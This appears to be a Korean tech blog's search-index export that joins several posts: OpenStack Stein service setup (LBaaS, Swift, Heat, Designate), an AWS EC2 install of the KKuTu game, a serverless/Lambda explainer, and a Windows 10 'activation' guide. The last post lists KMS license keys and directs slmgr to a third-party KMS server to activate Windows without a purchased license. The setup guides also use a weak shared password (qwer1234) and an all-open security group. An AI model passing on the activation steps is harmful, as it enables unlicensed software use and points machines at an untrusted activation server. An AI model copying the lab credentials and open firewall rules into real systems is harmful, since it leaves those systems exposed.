/etc/neutron/neutron.conf\rservice_plugins = router,lbaasv2\r# lbaasv2 서비스를 추가합니다.\r$ vi /etc/neutron/neutron_lbaas.conf\r[service_providers]\rservice_provider = LOADBALANCERV2:Haproxy:neutron_lbaas.drivers.haproxy.plugin_driver.HaproxyOnHostPluginDriver:default\r$ vi /etc/neutron/lbaas_agent.ini\r[DEFAULT]\rinterface_driver = openvswitch\r$ su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --subproject neutron-lbaas --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34;\r$ systemctl restart neutron-server\r  network 노드와 compute 노드는 동일하게 진행합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron-lbaas haproxy net-tools\r$ vi /etc/neutron/neutron.conf\rservice_plugins = router,lbaasv2\r$ vi /etc/neutron/neutron_lbaas.conf\r[service_providers]\rservice_provider = LOADBALANCERV2:Haproxy:neutron_lbaas.drivers.haproxy.plugin_driver.HaproxyOnHostPluginDriver:default\r$ vi /etc/neutron/lbaas_agent.ini\r[DEFAULT]\rinterface_driver = openvswitch\r$ systemctl start neutron-lbaasv2-agent\r$ systemctl enable neutron-lbaasv2-agent\r   8-3. LFS, LVM 기반 다중 스토리지 노드 구성    9. Swift ( 오브젝트 스토리지 서비스 ) 구성   Swift란 오브젝트 스토리지 서비스로, 흔히 우리가 생각하는 네이버 클라우드와 거의 동일한 맥락이라 할 수 있습니다. swift는 기본적으로 controller에 설치하나 여기서는 비교적 자원소모가 적은 network 노드에 proxy-sever를, compute 노드를 storage로 사용하여 설치하여 진행하겠습니다. swift에 대한 설명은 swift을 참조해주세요.**    swift 서비스 생성 controlloer 노드에는 swift 관련 패키지를 설치하지는 않지만 서비스의 관리를 위해 유저, 엔드포인트, url을 생성합니다.  $ openstack user create --domain default --project service --password qwer1234 swift\r$ openstack role add --project service --user swift admin\r$ openstack service create --name swift --description \u0026#34;OpenStack Object Storage\u0026#34; object-store\r# swfit 유저를 생성하고 관리자의 권한을 부여합니다.\r$ export swift_proxy=10.10.10.20\r$ openstack endpoint create --region RegionOne object-store public http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne object-store internal http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne object-store admin http://$swift_proxy:8080/v1/AUTH_%\\(tenant_id\\)s\r# swift의 endpoint를 등록합니다. 여기서 proxy 서버는 네트워크 노드를 등록합니다.\r    이어서 network 노드에서의 swift 설치 및 설정을 진행하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-swift-proxy python-memcached openssh-clients\r# swift 서비스에 필요한 패키지를 설치합니다.\r$ vi /etc/swift/proxy-server.conf\r[filter:cache]\ruse = egg:swift#memcache\r#memcache_servers = 127.0.0.1:11211\rmemcache_servers = controller:11211\r[filter:authtoken]\rpaste.filter_factory = keystonemiddleware.auth_token:filter_factory\r#admin_tenant_name = %SERVICE_TENANT_NAME%\r#admin_user = %SERVICE_USER%\r#admin_password = %SERVICE_PASSWORD%\r#admin_host = 127.0.0.1\r#admin_port = 35357\r#admin_protocol = http\r#admin_ /tmp/keystone-signing-swift\r# paste.filter_factory를 제외한 기존 정보는 주석처리\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = swift\rpassword = qwer1234\rdelay_auth_decision = true\r# 위에 내용을 대신 주석 추가\r# proxy-server.conf 파일을 수정합니다.\r# memcache_servers의 IP는 controller 노드의 IP로 수정합니다.\r$ vi /etc/swift/swift.conf\r[swift-hash]\r#swift_hash_path_suffix = %SWIFT_HASH_PATH_SUFFIX%\rswift_hash_path_suffix = swift_shared_path\rswift_hash_path_prefix = swift_shared_path\r  swift 서비스의 사용을 위해 account, container, object를 생성합니다.  $ swift-ring-builder /etc/swift/account.builder create 12 1 1\r$ swift-ring-builder /etc/swift/container.builder create 12 1 1\r$ swift-ring-builder /etc/swift/object.builder create 12 1 1\r# account, container, object를 생성합니다.\r# 12 = 한 클러스터 스토리지에서 생성 가능한 파티션의 수\r# 1 = 오브젝트 복수 수 ( 스토리지의 개수 )\r# 1 = 데이터 이동, 복제, 파티션 이동 등이 진행될 때 잠기는 최소 시간, 데이터 손실을 방지하기 위한 기능\r$ swift-ring-builder /etc/swift/account.builder add r0z0-10.10.10.30:6202/device0 100\r$ swift-ring-builder /etc/swift/container.builder add r0z0-10.10.10.30:6201/device0 100\r$ swift-ring-builder /etc/swift/object.builder add r0z0-10.10.10.30:6200/device0 100\r$ swift-ring-builder /etc/swift/account.builder rebalance\r$ swift-ring-builder /etc/swift/container.builder rebalance\r$ swift-ring-builder /etc/swift/object.builder rebalance\r# compute 노드의 builder에 region과 zone을 추가 후 반영시킵니다.\r# r = region, z = zone\r$ chown swift. /etc/swift/*.gz\r# swift 관련 파일의 소유권을 변경합니다.\r$ systemctl start openstack-swift-proxy\r$ systemctl enable openstack-swift-proxy\r# 프록시 서비스를 시작합니다.\r$ firewall-cmd --add-port=8080/tcp --permanent\r$ firewall-cmd --reload\r# 방화벽을 사용 중이라면 방화벽을 등록합니다.\r    이제 이어 storage를 구성하기 위해 compute 노드에서의 설치를 진행해보도록 하겠습니다. compute 노드는 이미 cinder 서비스가 동작하고 있어 기본적인 네트워크, 시간 설정, 레포지터리 지정 등은 구성이 마친 상태의 노드입니다. 만약 다른 노드에 구성하시거나 swift 서비스를 다중 노드로 구성하시는 경우 위와 같은 설정을 먼저 진행해주시길 바랍니다. 여기서는 swift 서비스를 위해 100G의 버츄얼 디스크( dev/sdc )를 추가하여 진행하였습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-swift-account openstack-swift-container openstack-swift-object xfsprogs rsync openssh-clients\r# swift 서비스를 설치합니다.\r$ scp root@network:/etc/swift/*.gz /etc/swift/\r$ chown swift. /etc/swift/*.gz\r# network 노드에서의 설정파일을 복사옵니다.\r$ vi /etc/swift/swift.conf\r[swift-hash]\r#swift_hash_path_suffix = %SWIFT_HASH_PATH_SUFFIX%\rswift_hash_path_suffix = swift_shared_path\rswift_hash_path_prefix = swift_shared_path\r$ swift.conf 파일을 설정합니다.\r$ vi /etc/swift/account-server.conf\rbind-ip = 0.0.0.0\rbind_port = 6202\r$ vi /etc/swift/container-server.conf\rbind-ip = 0.0.0.0\rbind_port = 6201\r$ vi /etc/swift/object-server.conf\rbind-ip = 0.0.0.0\rbind_port = 6200\r$ vi /etc/rsyncd.conf\rpid file = /var/run/rsymcd.pid\rlog file = /var/log/rsymcd.log\ruid = swift\rgid = swift\raddress = compute\r[account]\rpath = /srv/node\rread only = false\rwrite only = no\rlist = yes\rincoming chmod = 0644\routgoing chmod = 0644\rmax connections = 25\rlock file = /var/lock/account.lock\r[container]\rpath = /srv/node\rread only = false\rwrite only = no\rlist = yes\rincoming chmod = 0644\routgoing chmod = 0644\rmax connections = 25\rlock file = /var/lock/container.lock\r[object]\rpath = /srv/node\rread only = false\rwrite only = no\rlist = yes\rincoming chmod = 0644\routgoing chmod = 0644\rmax connections = 25\rlock file = /var/lock/object.lock\r[swift_server]\rpath = /etc/swift\rread only = true\rwrite only = no\rlist = yes\rincoming chmod = 0644\routgoing chmod = 0644\rmax connections = 5\rlock file = /var/lock/swift_server.lock\r# swift 서비스관련 파일을 수정합니다.\r  compute 노드에서 disk 설정을 진행합니다.  $ mkfs.xfs -i size=1024 -s size=4096 /dev/sdb1\rmeta-data=/dev/sdc1 isize=1024 agcount=4, agsize=6553536 blks\r= sectsz=4096 attr=2, projid32bit=1\r= crc=1 finobt=0, sparse=0\rdata = bsize=4096 blocks=26214144, imaxpct=25\r= sunit=0 swidth=0 blks\rnaming =version 2 bsize=4096 ascii-ci=0 ftype=1\rlog =internal log bsize=4096 blocks=12799, version=2\r= sectsz=4096 sunit=1 blks, lazy-count=1\rrealtime =none extsz=4096 blocks=0, rtextents=0\r# 디스크의 xfs의 유형으로 포맷시킵니다.\r$ mkdir -p /srv/node/device0\r$ mount -o noatime,nodiratime,nobarrier /dev/sdc1 /srv/node/device0\r$ chown -R swift. /srv/node\r# device0 디렉토리를 생성하고 해당 디렉토리에 sdb1 볼륨을 마운트시킨 후, swift로 소유권을 변경시킵니다.\r$ vi /etc/fstab\r/dev/sdc1 /srv/node/device0 xfs noatime,nodiratime,nobarrier 0 0\r# 재부팅할 경우를 대비하여 생성한 볼륨을 fstab에 등록합니다.\r    selinux 및 방화벽 관련 서비스를 설정합니다.  $ semanage fcontext -a -t swift_data_t /srv/node/device0\r$ restorecon /srv/node/device0\r$ firewall-cmd --add-port={873/tcp,6200/tcp,6201/tcp,6202/tcp} --permanent $ firewall-cmd --reload   swift 관련 서비스를 재시작합니다.  $ systemctl restart rsyncd openstack-swift-account-auditor openstack-swift-account-replicator openstack-swift-account openstack-swift-container-auditor openstack-swift-container-replicator openstack-swift-container-updater openstack-swift-container openstack-swift-object-auditor openstack-swift-object-replicator openstack-swift-object-updater openstack-swift-object\r$ systemctl enable rsyncd openstack-swift-account-auditor openstack-swift-account-replicator openstack-swift-account openstack-swift-container-auditor openstack-swift-container-replicator openstack-swift-container-updater openstack-swift-container openstack-swift-object-auditor openstack-swift-object-replicator openstack-swift-object-updater openstack-swift-object\r  확인을 위해 controller 노드에 httpd를 재시작합니다.  $ systemctl restart httpd\r# 대시보드 접속 후 프로젝트에서 오브젝트 스토리지가 메뉴에 있는 지를 확인합니다.\r$ openstack container create test\r+---------------------------------------+-----------+------------------------------------+\r| account | container | x-trans-id |\r+---------------------------------------+-----------+------------------------------------+\r| AUTH_2ac06290d2d943d5a768fe3daa53b118 | test | tx22f3dd125f134a189602c-005f24cef1 |\r+---------------------------------------+-----------+------------------------------------+\r$ echo Hello \u0026gt; test.txt\r$ swift upload test test.txt\r$ swift list\rtest\r$ swift list test\rtest.txt\r   Heat ( Orchestration ) 설치   클라우딩 컴퓨팅이 꽃인 Orchestaration 기능을 수행하는 Heat 서비스를 설치해보도록 하겠습니다. Heat 설치는 controller, network 노드 순으로 우리어집니다. Heat*에 대한 설명은 Heat을 참조해주세요.    Heat 서비스 생성  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-heat-common python-heatclient\r# heat 서비스 관련 패키지를 다룬로드 합니다.\r$ openstack user create --domain default --project service --password qwer1234 heat\r$ openstack role add --project service --user heat admin\r$ openstack role create heat_stack_owner\r$ openstack role create heat_stack_user\r$ openstack role add --project admin --user admin heat_stack_owner\r$ openstack service create --name heat --description \u0026#34;Openstack Orchestration\u0026#34; orchestration\r$ openstack service create --name heat-cfn --description \u0026#34;Openstack Orchestration\u0026#34; cloudformation\r# heat 유저를 생성하고 관리자의 권한을 부여합니다.\r$ export heat_api=10.10.10.20\r$ openstack endpoint create --region RegionOne orchestration public http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne orchestration internal http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne orchestration admin http://$heat_api:8004/v1/AUTH_%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne cloudformation public http://$heat_api:8000/v1\r$ openstack endpoint create --region RegionOne cloudformation internal http://$heat_api:8000/v1\r$ openstack endpoint create --region RegionOne cloudformation admin http://$heat_api:8000/v1\r# heat 서비스의 endpoint를 등록합니다. 여기서 proxy 서버는 네트워크 노드를 등록합니다.\r$ openstack domain create --description \u0026#34;Stack projects and users\u0026#34; heat\r$ openstack user create --domain heat --password qwer1234 heat_domain_admin\r$ openstack role add --domain heat --user heat_domain_admin admin\r# heat domain을 생성하고 heat 유저에게 권한을 부여합니다.\r  heat의 DB를 생성합니다.  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database heat;\rMariaDB [(none)]\u0026gt; grant all privileges on heat.* to heat@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on heat.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# heat DB를 생성합니다. 여기서 pw는 qwer1234으로 모두 통일하였습니다.\r  이어서 network 노드에서 heat 서비스를 설치해보겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-heat-api openstack-heat-api-cfn openstack-heat-engine python-heatclient\r# heat 서비스를 위한 패키지를 설치합니다.\r$ vi /etc/heat/heat.conf\r[DEFAULT]\rdeferred_auth_method = trusts\rtrusts_delegated_roles = heat_stack_owner\r# Heat installed server\rheat_metadata_server_url = http://network:8000\rheat_waitcondition_server_url = http://network:8000/v1/waitcondition\rheat_watch_server_url = http://network:8003\rheat_stack_user_role = heat_stack_user\r# Heat domain name\rstack_user_domain_name = heat\r# Heat domain admin name\rstack_domain_admin = heat_domain_admin\r# Heat domain admin\u0026#39;s password\rstack_domain_admin_password = qwer1234\r# RabbitMQ connection info\rtransport_url = rabbit://openstack:qwer1234@controller\r# MariaDB connection info\r[database]\rconnection = mysql+pymysql://heat:qwer1234@controller/heat\r# Keystone auth info\r[clients_keystone]\rauth_uri = http://controller:5000\r# Keystone auth info\r[ec2authtoken]\rauth_uri = http://controller:5000\r[heat_api]\rbind_host = 0.0.0.0\rbind_port = 8004\r[heat_api_cfn]\rbind_host = 0.0.0.0\rbind_port = 8000\r# Keystone auth info\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = heat\rpassword = qwer1234\r[trustee]\rauth_plugin = password\rauth_url = http://controller:5000\rusername = heat\rpassword = qwer1234\ruser_domain_name = default\r# heat.conf 파일을 수정합니다.\r$ su -s /bin/bash heat -c \u0026#34;heat-manage db_sync\u0026#34;\r$ systemctl start openstack-heat-api openstack-heat-api-cfn openstack-heat-engine\r$ systemctl enable openstack-heat-api openstack-heat-api-cfn openstack-heat-engine\r# DB의 데이터를 삽입하고, 서비스슬 등록합니다.\r  방화벽을 사용중이면 방화벽을 설정합니다.  $ firewall-cmd --add-port={8000/tcp,8004/tcp} --permanent\r$ firewall-cmd --reload\r   $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-designate-api openstack-designate-central openstack-designate-worker openstack-designate-producer openstack-designate-mdns python-designateclient bind bind-utils\r# 서비스 관련 패키지를 설치합니다.\r$ rndc-confgen -a -k designate -c /etc/designate.key -r /dev/urandom\r$ chown named:designate /etc/designate.key\r$ chmod 640 /etc/designate.key\r# key를 생성합니다.\r$ vi /etc/named.conf\r# create new\roptions {\rlisten-on port 53 { any; };\rlisten-on-v6 port 53 { none; };\rdirectory \u0026#34;/var/named\u0026#34;;\rdump-file \u0026#34;/var/named/data/cache_dump.db\u0026#34;;\rstatistics-file \u0026#34;/var/named/data/named_stats.txt\u0026#34;;\rmemstatistics-file \u0026#34;/var/named/data/named_mem_stats.txt\u0026#34;;\r# replace query range to your own environment\rallow-query { localhost; 10.10.10.0/24; };\rallow-new-zones yes;\rrequest-ixfr no;\rrecursion no;\rbindkeys-file \u0026#34;/etc/named.iscdlv.key\u0026#34;;\rmanaged-keys-directory \u0026#34;/var/named/dynamic\u0026#34;;\rpid-file \u0026#34;/run/named/named.pid\u0026#34;;\rsession-keyfile \u0026#34;/run/named/session.key\u0026#34;;\r};\rinclude \u0026#34;/etc/designate.key\u0026#34;;\rcontrols {\rinet 0.0.0.0 port 953\rallow { localhost; } keys { \u0026#34;designate\u0026#34;; };\r};\rlogging {\rchannel default_debug {\rfile \u0026#34;data/named.run\u0026#34;;\rseverity dynamic;\r};\r};\rzone \u0026#34;.\u0026#34; IN {\rtype hint;\rfile \u0026#34;named.ca\u0026#34;;\r};\r$ chown -R named. /var/named\r$ systemctl start named\r$ systemctl enable naemd\r$ vi /etc/designate/designate.conf\r[DEFAULT]\rlog_dir = /var/log/designate\rtransport_url = rabbit://openstack:qwer1234@controller\rroot_helper = sudo designate-rootwrap /etc/designate/rootwrap.conf\r[database]\rconnection = mysql+pymysql://heat:qwer1234@controller/heat\r[service:api]\rlisten = 0.0.0.0:9001\rauth_strategy = keystone\rapi_base_uri = http://controller:9001\renable_api_v2 = True\renabled_extensions_v2 = quotas, reports\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = heat\rpassword = qwer1234\r[service:worker]\renabled = True\rnotify = True\r[storage:sqlalchemy]\rconnection = mysql+pymysql://heat:qwer1234@controller/heat\r$ su -s /bin/sh -c \u0026#34;designate-manage database sync\u0026#34; designate\r$ systemctl start designate-central designate-api\r$ systemctl enable designate-central designate-api\r$ vi /etc/designate/pools.yaml\r# create new (replace hostname and IP address to your own environment)\r- name: default\rdescription: Default Pool\rattributes: {}\rns_records:\r- hostname: network.srv.world.\rpriority: 1\rnameservers:\r- host: 10.10.10.20\rport: 53\rtargets:\r- type: bind9\rdescription: BIND9 Server\rmasters:\r- host: 10.10.10.20\rport: 5354\roptions:\rhost: 10.10.10.20\rport: 53\rrndc_host: 10.10.10.20\rrndc_port: 953\rrndc_key_file: /etc/designate.key\r$ su -s /bin/sh -c \u0026#34;designate-manage pool update\u0026#34; designate\rUpdating Pools Configuration\r$ systemctl start designate-worker designate-producer designate-mdns\r$ systemctl enable designate-worker designate-producer designate-mdns\r  이어서 selinux와 방화벽을 설정합니다.  $ setsebool -P named_write_master_zones on\r$ firewall-cmd --add-service=dns --permanent\r$ firewall-cmd --add-port={5354/tcp,9001/tcp} --permanent\r$ firewall-cmd --reload\rcontroller\u0026gt; $openstack dns service list\r# 확인\r     11. Openstack 대시보드 메인 로고 및 링크 변경    12. Neutron 기반 Service Functon Chaining ( SFC ) 기능 구성   #\n"});index.add({'id':132,'href':'/docs/cloudcomputing/awstraining/base/','title':"Base",'content':"****    ****          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':133,'href':'/docs/cloudcomputing/docker/base/','title':"Base",'content':"****    ****          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':134,'href':'/docs/cloudcomputing/openstacktraining/openstack-%EB%AA%85%EB%A0%B9%EC%96%B4/','title':"Openstack 명령어",'content':"OpenStack 명령어 입력시, 옵션이 많으니 사용 시 사전에 확인할 것\n대부분의 명령어 입력은 기본 값으로 진행\r\r compute service   인스턴스 리스트 출력  openstack server list\r  인스턴스 생성  openstack server create --image [] --flavor [] --key-name [] --network [] [ server_name ]\r  인스턴스 제거  openstack server delete [ 서버 이름 ]\r  인스턴스 시작  openstack server start [ 서버 이름 ]\r  인스턴스 정지  openstack server stop [ 서버 이름 ]   인스턴스 상세설명  openstack server show [ 서버 이름 ]\r  인스턴스 수정  openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack       openstack  "});index.add({'id':135,'href':'/docs/network/network/base/','title':"Base",'content':"****    ****          "});index.add({'id':136,'href':'/docs/cloudcomputing/awstraining/game/','title':"EC2 끄투온라인 서버 구축",'content':"AWS 끄투온라인 서버 구축    AWS 끄투온라인 서버 구축      끄투 온라인은 오픈소스의 끝말잇기 게임입니다.      EC2를 생성합니다. EC2 생성은 EC2 생성을 참조해주세요.     OS 유형 disk security group     Ubuntu18.04 t2.mini 8 all-open      인스턴스를 생성 후, 아래와 같이 진행합니다.  $ sudo apt -y update\r$ sudo apt -y upgrade\r$ sudo apt -y install node.js\r$ sudo apt -y install npm\r$ npm install -g grunt grunt-cli\r$ sudo apt -y install postgresql\r$ sudo apt -y install git\r$ sudo git clone https://github.com/JJoriping/KKuTu.git\r# 서버 구축에 필요한 패키지들을 설치합니다.\r$ sudo su - postgres\r$ psql\rpostgres=# ALTER USER postgres with encrypted password \u0026#39;qwer1234\u0026#39;;\rpostgres=# CREATE DATABASE main;\rpostgres-# \\l\rList of databases\rName | Owner | Encoding | Collate | Ctype | Access privileges\r-----------+----------+----------+---------+---------+-----------------------\rmain | postgres | UTF8 | C.UTF-8 | C.UTF-8 |\rpostgres | postgres | UTF8 | C.UTF-8 | C.UTF-8 |\rtemplate0 | postgres | UTF8 | C.UTF-8 | C.UTF-8 | =c/postgres +\r| | | | | postgres=CTc/postgres\rtemplate1 | postgres | UTF8 | C.UTF-8 | C.UTF-8 | =c/postgres +\r| | | | | postgres=CTc/postgres\r# 게임 데이터의 삽입을 위한 DB를 생성합니다.\r# 새로운 커널 하나를 다시 킨 후 $ cd KKuTu/Server/lib/sub/\r$ mv global.inc.json global.json $ mv auth.inc.json auth.json\r$ vi global.json\r\u0026#34;PASS\u0026#34;:\u0026#34;...\u0026#34;, \u0026gt;\u0026#34;PASS\u0026#34;:\u0026#34;qwer1234\u0026#34;,\r\u0026#34;PG_PASSWORD\u0026#34;: \u0026#34;...\u0026#34;,\u0026gt; \u0026#34;PG_PASSWORD\u0026#34;: \u0026#34;qwer1234\u0026#34;,\r# DB에 접속하기 위한 패스워드를 수정합니다.\r$ cd ~/KKuTu\r$ sudo -u postgres psql --quiet main \u0026lt; ./db.sql\r# DB를 삽입합니다.\r$ chmod +x server-setup.bat\r$ ./server-setup.bat\r$ node ./Server/lib/Game/cluster.js 0 1\r$ ctrl + z\r$ bg\r$ disown -h\r$ node Server/lib/Web/cluster.js 1 $ ctrl + z\r$ bg\r$ disown -h\r$ netstat -anlp | grep :8496\r$ netstat -anlp | grep :80\r# 확인\rIP ] 접속\r  #\n"});index.add({'id':137,'href':'/docs/project/','title':"Project",'content':""});index.add({'id':138,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/','title':"정리전",'content':"#\n"});index.add({'id':139,'href':'/posts/','title':"Blog",'content':""});index.add({'id':140,'href':'/posts/lambda/','title':"Lambda",'content':"Lambda   Lambda는 기본적으로 AWS의 서비스 중 하나인 Lambda를 의미하며 일반적으로 서버리스 아키텍처로 사용됩니다.\n  여기서 서버리스 아키텍처란 실행을 위해 서버에 직접 접근하지 않는 새로운 종류의 소프트웨어 아키텍처를 의미합니다.\n  Lambda는 AWS 기반에서 자바스크립트, 파이썬, C#, 자바로 작성한 코드를 실행하는 컴퓨팅 서비스입로, 소스 코드는 압축되어 메모리, 디스크 공간과 CPU가 할당된 격리된 컨테이너에 배포됩니다.\n  그럼 본격적으로 Lambda에 대해 알아보도록 하겠습니다.\n     Server or Serverless   Server  상단의 그림은 기본적인 3 tier 애플리케이션의 구조입니다. 3 tier 애플리케이션은 기본적으로 프레젠테이션, 애플리케이션, 데이터 단계로 구성되며, 하나의 단계는 위의 그림과 같이 특정 책임을 갖는 복수 단계의 계층을 가집니다. 일반적인 서버의 계층화는 관리영역을 분리하는 데 도움을 주지만, 되려 많은 계층은 변경을 어렵게 하며 구현속도를 저지시킬 수 있습니다. 또한 여러 계층에 관리영역이 걸쳐있다면, 모든 계층에서 문제가 발생할 수도 있습니다.     Serverless   반면에 서버리스 아키텍처는 전통적인 단일 백엔드 시스템이 없으며, 애플리케이션의 프론트엔드는 API Gateway로 직접 서비스, 데이터베이스 또는 컴퓨팅 함수와 통신합니다. 하지만 일부 서비스들은 추가적인 보안 조치의 유효성 검사가 수행되는 컴퓨팅 서비스 하수 뒤에 감추어져 있어야 합니다.\n  그럼 이제 본격적으로 서버리스 아키텍처가 무엇인지 알아보도록 하겠습니다.\n     Serverless Architecture   필요할 시에만 코드를 실행   서버리스 아키텍처는 기본적으로 SOA에서 제기된 개념을 자연스럽게 확장한 것으로, 서버리스 아키텍처에서 모든 사용자 코드는 AWS Lambda 같은 상태를 유지하지 않는 컴퓨팀 서비스에서 실행되는, 격리되고 독립적이며 때로는 세분화된 함수로 작성되고 실행됩니다. 개발자는 함수를 작성해 데이터 소스에서 데이터를 읽고 쓰고, 다른 함수를 호출 및 계산이 가능합니다.   SOA ( 서비스 지향 아키텍처 ) : 대규모 컴퓨터 시스템을 구축할 때의 개념으로 업무상의 일 처리에 해당하는 소프트웨어 기능을 서비스로 판단하여 그 서비스를 네트워크상에 연동하여 시스템 전체를 구축해 나가는 방법론을 뜻합니다.       단일 목적의 상태 없는 함수 작성    단일 책임의 원칙을 갖는 함수를 설계하려 노력해야 합니다. 한 가지의 역할만을 수행하는 함수의 테스트가 보다 쉽고 견고하며, 버그도 적고 디대하지 않은 부작용도 더 적습니다. Orchestration에서 함수와 서비스를 작성하고 조합해 이해하고 관리하기 쉬운 복잡한 백엔드 시스템을 구축할 수도 있으며, 또한 잘 정의된 인터페이스를 갖는 세분화된 함수는 서버리스 아키텍처에서 재사용될 가능성이 높습니다.    푸시 기반, 이벤트 주도 파이프라인 설계    서버리스 아키텍처는 어떤 용도로도 구축될 수 있으며, 초창기부터 서버리스로 구축할 수도 있고, 재설계가 가능합니다. 여기에서 가장 유연하고 강력한 서버리스 설계는 이벤트 주도 방식으로, 이벤트 주도, 푸시 기반 시스템의 구축으로 비용과 복잡성이 줄일 수 있습니다.    강력한 프론트엔드 구축    Lambda에서 동작하는 사용자 코드는 빨리 실행되야 한다는 것을 기억하는 것이 중요합니다. Lambda 가격은 함수 요청 횟수, 실행 시간, 할당된 메모리 크기를 기반으로 정해지므로 빨리 종료되는 함수가 더 저렴하다 할 수 있습니다.    상단의 그림은 푸시 기반 파이프라인 형태의 설계로, 사용자가 비디오를 업데이트하고, 비디오는 다른 형태로 변환되는 과정입니다. 사용자가 발행받는 토큰은 프론트엔드가 안전한 방식으로 데이터베이스를 포함한 여러 다른 서비스와 통신할 수 있게 합니다. 이것이 모든 통신이 백엔드 서버로 흘러가는 전통적인 시스템과 대비되는 부분입니다. 하지만 프론트엔드에서 처리하면 안되는 신용 카드, 이메일 전송 등에 대한 정보는 컴퓨팅 서비스를 사용해 동작을 조율하고 데이터를 검증 및 보안해야합니다.     Serverless의 장단점    기본적으로 서버리스를 구현하면 비용 절감과 출시 시간 단축이라는 장점이 있지만, 생성되는 애플리케이션의 관점에서의 서버리스 아키텍처로 가는 길은 신중하게 고려할 필요가 있습니다.    단일 구조의 애플리케이션의 변환    서버리스 아키텍처는 양자택일의 명제가 아니며, 현재 서버에서 실행 중인 단일 구조의 애플리케이션이 있다면, 구성 요소를 점진적으로 분리해 격리된 서비스나 컴퓨팅 함수를 실행해야 합니다.\n  또한 단일 구조의 애플리케이션을 IaaS, PaaS, 컨테이너, Lambda, 서드파티 서비스 등의 여러가지 형태로 분리가 가능합니다.\n  이와 같은 서버리스 아키텍처로의 변환은 개발자가 인프라가 아닌 소프트웨어 설계와 코드에 집중할 수 있게 해주며, 확장성과 고가용성 및 비용절감에 보다 공정하고 복잡성을 줄일 수 있지만, 특정 서비스에 따라서는 비용이 비효율적으로 발생할 수 있으며, 네트워크 기반의 장애가 발생한 경우, 처리가 어려운 단점 등이 존재합니다.\n    기본적인 서버리스 아키텍처의 원칙  하단의 서버리스 아키텍처의 원칙은 반드시 지켜야하는 원칙은 아니지만, 서버리스 애플리케이션 구축 시, 결정을 내리는 데 도움이 되는 원칙을 사용해야합니다.  1. 컴퓨팅 서비스를 사용해 요구에 맞게 코드를 실행한다. ( 서버 없이 ) 2. 단일 목적의 상태 없는 함수를 작성한다. 3. 푸시 기반 ( Push-based ), 이벤트 주도 ( event-driven ) 파이프라인을 설계한다. 4. 더 두텁고 강한 프런트엔드를 만든다. 5. 서드파티 서비스를 받아들인다.    "});index.add({'id':141,'href':'/posts/window10/','title':"Window 10 무설치 정품인증",'content':"Window 10 무설치 정품인증    단순히 Window 10의 명령프롬프트를 사용하여 간단하게 윈도우 인증을 완료하는 방법을 알려드리겠습니다.    명령프롬프트를 사용한 정품인증   먼저 검색 or 실행 ( Window 키 + R )에서 dxdiag 또는 winver를 검색 후, 운영체제의 버전을 확인해주세요. 위의 그림은 winver를 통해 확인한 모습입니다.      다음으로는 인증 키의 설정을 위해 위의 그림과 같이 명령 프롬프트를 관리자 권한으로 실행합니다.      아래의 명령어를 입력해주세요. [ licensekey는 하단의 표에서 본인에게 맞는 버전을 선택하여 복사해주세요. ]  $ slmgr /ipk [ licensekey ]\r   Version Key     Home TX9XD-98N7V-6WMQ6-BX7FG-H8Q99   Home N 3KHY7-WNT83-DGQKR-F7HPR-844BM   Home Single Language 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH   Home Country Specific PVMJN-6DFY6-9CCP6-7BKTT-D3WVR   Professional W269N-WFGWX-YVC9B-4J6C9-T83GX   Professional N MH37W-N47XK-V7XM9-C7227-GCQG9   Education NW6C2-QMPVW-D7KKK-3GKT6-VCFB2   Education N 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ   Enterprise NPPR9-FWDCX-D2C8J-H872K-2YT43   Enterprise N DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4#       $ slmgr /skms kms8.msguides.com\r 입력이 완료되면 상단의 명령어를 입력하세요. KMS 서버와 연결됩니다.     $ slmgr /ato\r KMS 서버에 인증이 완료되면 상단의 명령어를 입력합니다. 명령어를 Windows가 성공적으로 활성화되었음을 확인할 수 있습니다.     $ slmgr -xpr\r 상단의 명령어로 정품인증이 되었는 지 확인할 수 있습니다. 만약 정품 